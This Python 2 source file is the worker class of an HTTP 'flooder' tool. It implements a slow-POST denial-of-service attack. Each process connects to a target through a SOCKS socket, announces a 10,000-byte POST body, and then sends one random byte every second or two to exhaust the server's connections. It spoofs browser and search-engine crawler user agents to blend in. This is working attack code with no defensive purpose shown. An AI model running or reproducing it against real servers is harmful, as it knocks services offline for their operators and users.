import socks, time
from Functions import *
from multiprocessing import Process

class HTTPWorkerThread(Process):

    def __init__(self, flooder, id):
        Process.__init__(self)
        self.id = id
        self.socket = socks.socksocket()

        self.host = flooder.host
        self.port = flooder.port
        self.running = True

        self.useragents = {1 : 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
                2 : 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
                3 : 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)',
                4 : 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
                5 : 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
                6 : 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
                7 : 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
                8 : 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                9 : 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)',
                10 : 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
                11 : 'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)' }

        if flooder.random:
            self.message = randomString(256)
        else:
            self.message = self.flooder.message

        print "initialized http thread"

    def stop(self):
        self.running = False

    def sendHTTPHeader(self):
        self.socket.send("POST / HTTP/1.1\r\n"
                          "Host: %s\r\n"
                          "User-Agent: %s\r\n"
                          "Connection: keep-alive\r\n"
                          "Keep-Alive: 900\r\n"
                          "Content-Length: 10000\r\n"
                          "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                          (self.host, self.useragents[random.randrange(1,12)]))
        #print "thread", self.id, "send header"
        
        for i in range(0, 9999):
            self.socket.send(randomString(1))
            time.sleep(random.randrange(1, 3))

        self.socket.close()

    def run(self):
        try:
            while self.running:
                while self.running:
                    try:
                        self.socket.connect((self.host, self.port))
                        #print "thread", self.id, "connected"
                        break
                    except Exception, e:
                        if e.args[0] == 106 or e.args[0] == 60:
                            break
                        #print "Couldn't connect:", e.args, self.host, self.port
                        time.sleep(1)
                        continue
                    break

                try:
                    self.sendHTTPHeader()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        #print "thread", self.id ,"connection broken, retrying."
                        self.socket = socks.socksocket()
                    #print "Couldn't send message on thread", self.id, "because", e.args
                    time.sleep(0.1)
                    pass
        except KeyboardInterrupt:
            return

    def __getstate__(self):
        odict = self.__dict__.copy()
        del odict['socket']
        return odict

    def __setstate__(self, dict):
        self.__dict__.update(dict)
        self.socket = socket.socket()
        self.socket.setblocking(1)
